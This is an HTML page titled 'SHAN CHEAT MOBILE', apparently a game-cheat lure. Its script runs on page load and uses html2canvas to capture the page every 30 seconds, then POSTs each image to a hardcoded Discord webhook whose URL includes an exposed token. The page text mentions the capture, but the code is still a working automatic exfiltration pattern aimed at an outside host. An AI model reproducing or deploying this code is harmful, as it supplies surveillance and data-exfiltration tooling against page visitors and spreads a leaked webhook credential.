<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHAN CHEAT MOBILE</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
</head>
<body>
    <h1>Website Loaded</h1>
    <p>The page will automatically capture screenshots every 30 seconds and send to Discord.</p>

    <script>
        // Function to capture screenshot and send to Discord
        function captureAndSendToDiscord() {
            html2canvas(document.body).then(function(canvas) {
                const imgData = canvas.toDataURL('image/png');
                sendToDiscord(imgData);
            });
        }

        // Function to send captured image to Discord webhook
        function sendToDiscord(imageData) {
            const webhookURL = 'https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI'; // Replace with your Discord Webhook URL
            const payload = {
                content: "Automated Screen Capture",
                embeds: [{
                    image: { url: imageData }
                }]
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => console.log('Successfully sent to Discord:', data))
            .catch(error => console.error('Error:', error));
        }

        // Start capturing screenshots automatically every 30 seconds after the page loads
        window.onload = function() {
            setInterval(captureAndSendToDiscord, 30000); // 30000ms = 30 seconds
        };
    </script>
</body>
</html>
